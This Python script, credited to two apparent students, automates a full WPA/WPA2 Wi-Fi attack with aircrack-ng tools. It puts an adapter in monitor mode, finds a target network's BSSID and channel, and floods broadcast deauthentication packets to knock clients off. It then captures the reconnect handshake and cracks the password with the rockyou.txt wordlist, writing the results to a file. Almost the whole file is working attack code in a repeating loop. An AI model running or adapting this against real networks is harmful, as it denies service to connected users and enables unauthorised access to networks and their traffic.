# Contributed by:

# Adarsh D - 2024PCS0018
# Yash Deshpande - 2024PCS0044


# Warning: This is code does not handle all the exceptions properly

import subprocess
import time
import os
import signal

# Finds the channel and BSSID of the target Wi-Fi network by parsing airodump-ng output file.
# Warning: this functions crashes when desired network is not in captured dump. Exception is not handled
def get_wifi_info(ssid):

    print("Trying to get wifi info...")
    try:
        # Run airodump-ng in the background and redirect output to a file
        process = subprocess.Popen(['sudo', 'airodump-ng', 'wlan0mon', '--output-format', 'csv', '-w', 'temp_scan'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        #time.sleep(5)
        #process.terminate()
        #process.wait()
        process.wait(timeout=7)
    except subprocess.TimeoutExpired:
        #process.terminate()
        process.send_signal(signal.SIGKILL)
        time.sleep(1)
        process.wait()

        # Read the CSV file generated by airodump-ng
        networks_file = "temp_scan-01.csv"
        try:
            with open(networks_file, 'r') as f:
                for line in f:
                    if "BSSID" in line:
                        # Skip the header line
                        continue
                    parts = line.strip().split(',')
                    if len(parts) > 5 and ssid.strip() == parts[13].strip():
                        bssid = parts[0].strip()
                        channel = parts[3].strip()
                        print(f"Found SSID: {ssid}, BSSID: {bssid}, Channel: {channel}")
                        # Clean up the temporary file
                        subprocess.run(['rm', networks_file], check=False)
                        return channel, bssid
        except FileNotFoundError:
            print(f"Error: {networks_file} not found.")
        finally:
            # Ensure the temporary file is cleaned up even if SSID is not found
            subprocess.run(['rm', 'temp_scan-01.csv'], check=False)

        print(f"Could not find information for SSID: {ssid} in the scan.")
        return None, None

    except Exception as e:
        print(f"An error occurred during the scan: {e}")
        return None, None

# Puts the Wi-Fi interface into monitor mode, optionally on a specific channel
def start_monitor_mode(interface, channel=None):

    print("interface: ",interface)
    print("channel: ",channel)
    try:
        command = ['sudo', 'airmon-ng', 'start', interface]
        if channel != None:
            command = ['sudo', 'airmon-ng', 'start', interface, channel]

        result = subprocess.run(command, check=True, capture_output=True, text=True)
        print("starting monitor mode...")
        #time.sleep(2)

        return "wlan0mon" # return hardcoded values instead of parsing output

        # The monitor interface name might change (e.g., wlan0 becomes wlan0mon)
        # We need to parse the output to get the correct interface name
        for line in result.stdout.splitlines():
            if "monitor mode enabled on" in line:
                monitor_interface = line.split()[-1]
                print(f"Monitor mode enabled on {monitor_interface} {'on channel ' + channel if channel else ''}")
                return monitor_interface
        print(f"Warning: Could not determine monitor interface from airmon-ng output.")
        return f"{interface}mon" # Fallback in case parsing fails
    except subprocess.CalledProcessError as e:
        print(f"Error enabling monitor mode: {e}")
        return None

# Stops monitor mode on the Wi-Fi interface.
def stop_monitor_mode(monitor_interface):

    try:
        subprocess.run(['sudo', 'airmon-ng', 'stop', monitor_interface], check=True, capture_output=True, text=True)
        print(f"Monitor mode disabled on {monitor_interface}")
    except subprocess.CalledProcessError as e:
        print(f"Error disabling monitor mode: {e.stderr}")

# Sends deauthentication packets from an interface which is is in monitor mode
def send_deauth(monitor_interface, ap_mac, channel, count=1):

    # original_interface = interface.replace("mon", "") # Get the original interface name
    # stop_monitor_mode(interface)
    # monitor_interface = start_monitor_mode(original_interface, channel)
    if monitor_interface:
        try:
            print(f"Sending {count} deauthentication packets to {ap_mac} (client) via {monitor_interface} on channel {channel}... ")
            subprocess.run(['sudo', 'aireplay-ng', '--deauth', str(count), '-a', ap_mac, '-c', 'ff:ff:ff:ff:ff:ff', monitor_interface], check=True, capture_output=True, text=True)
            print("Deauthentication packet sent.")
            return True
        except subprocess.CalledProcessError as e:
            print(f"Error sending deauthentication packets: {e}")
            return False
    else:
        print("Failed to enable monitor mode for deauthentication.")
        return False

# Captures traffic to find WPA/WPA2 handshake packets.
def capture_packets(monitor_interface, bssid, channel, output_prefix="capture_output"):

    try:
        print(f"Capturing handshake on BSSID {bssid}, channel {channel}...")
        subprocess.run(['sudo', 'airodump-ng', '--bssid', bssid, '-c', channel, '-w', output_prefix, monitor_interface], check=True, capture_output=False) # Keep output visible
        print("Capture process started. Press Ctrl+C to stop.")
    except subprocess.CalledProcessError as e:
        print(f"Error starting packet capture: {e.stderr}")

# Captures Wi-Fi packets for a specified duration.
def capture_packets_duration(monitor_interface, bssid, channel, output_prefix="capture_output", capture_duration=60):

    try:
        print(f"Capturing handshake on BSSID {bssid}, channel {channel} for {capture_duration} seconds...")
        capture_process = subprocess.Popen(['sudo', 'airodump-ng', '--bssid', bssid, '-c', channel, '-w', output_prefix, monitor_interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        #time.sleep(capture_duration)
        capture_process.wait(timeout=capture_duration)
    except subprocess.TimeoutExpired:
        #capture_process.terminate()
        capture_process.send_signal(signal.SIGKILL)
        time.sleep(1)
        capture_process.wait()
        print("Capture process stopped.")
        return f"{output_prefix}-01.cap"
    except Exception as e:
        print(f"Error during packet capture: {e}")
        return None

# Attempts to crack the Wi-Fi password using a dictionary file and writes the result to an output file
def crack_password(capture_file_path, ssid, output_file="cracked_passwords.txt", dictionary_file="rockyou.txt"):

    password_found = None
    try:
        print(f"Attempting to crack password for SSID '{ssid}' using {dictionary_file} on {capture_file_path}...")
        output = subprocess.run(['sudo', 'aircrack-ng', '-w', dictionary_file, capture_file_path], check=True, capture_output=True, text=True)
        print("Aircrack-ng output:\n", output.stdout)
        if "KEY FOUND!" in output.stdout:
            # Extract and print the key
            key_line = [line for line in output.stdout.splitlines() if "KEY FOUND!" in line][0]
            password = key_line.split('[')[1].split(']')[0]
            print(f"\n[+] Password found for '{ssid}': {password}")
            password_found = output.stdout
        else:
            print(f"\n[-] Password for '{ssid}' not found in the dictionary.")
            password_found = "Null"
    except subprocess.CalledProcessError as e:
        print(f"Error running aircrack-ng: {e.stderr}")
        password_found = "Error"
    finally:
        # Delete the capture file regardless of whether the password was cracked
        if os.path.exists(capture_file_path):
            os.remove(capture_file_path)
            print(f"Deleted capture file: {capture_file_path}")
        else:
            print(f"Capture file not found: {capture_file_path}")

        # Write the result to the output file
        with open(output_file, "a") as f:
            f.write(f"{password_found}\n")
        print(f"Result written to {output_file}")
        return password_found

def read_config(config_file="wifi_config.txt"):
    """Reads the target SSID from the config file."""
    try:
        with open(config_file, 'r') as f:
            ssid = f.readline().strip()
        return ssid
    except FileNotFoundError:
        print(f"Error: {config_file} not found. Please create this file with your Wi-Fi SSID.")
        return None



if __name__ == "__main__":
    try:
        wifi_interface = "wlan0"  # Wi-Fi interface name, in our case the adapter defaulted to wlan0
        config_file = "wifi_config.txt" # file with ssid name
        dictionary_file = "rockyou.txt" # Dictionary file

        target_ssid = read_config(config_file)
        if not target_ssid:
            exit()
        
        command = ['find', '.', '-name', '*capture*', '-type', 'f', '-delete']
        subprocess.run(command, check=False)
            
        channel = None

        monitor_mode_interface = start_monitor_mode(wifi_interface,channel=channel)
        time.sleep(5)
        if monitor_mode_interface:
            while channel==None:
                channel, bssid = get_wifi_info(target_ssid)
		
            if channel and bssid:
                print(f"Target SSID found: {target_ssid}, BSSID: {bssid}, Channel: {channel}")
                time.sleep(3)
                stop_monitor_mode(monitor_mode_interface)
                time.sleep(5)
                start_monitor_mode(wifi_interface,channel)
                time.sleep(5)

        while True:

            print("Jamming for 1 minute...")

            myitr=15

            try:
                while myitr:
                    if send_deauth(monitor_mode_interface, bssid, channel):
                        time.sleep(1)
                    else:
                        print("Deauth failed. Stopping jamming.")
                        break
                    myitr-=1
            except KeyboardInterrupt:
                # stop_monitor_mode(monitor_mode_interface)
                print("\nStopping jamming...")
            
            time.sleep(2)
            print("stopped jamming.")
            
            print("capturing for 1 minute...")
            capture_file = capture_packets_duration(monitor_mode_interface, bssid, channel)
            print("Finished capturing packets.")
            print("Cracking password...")
            crack_password(capture_file, target_ssid, dictionary_file=dictionary_file)
            command = ['find', '.', '-name', '*capture*', '-type', 'f', '-delete']
            subprocess.run(command, check=False)

    except Exception as e:
        print(e)
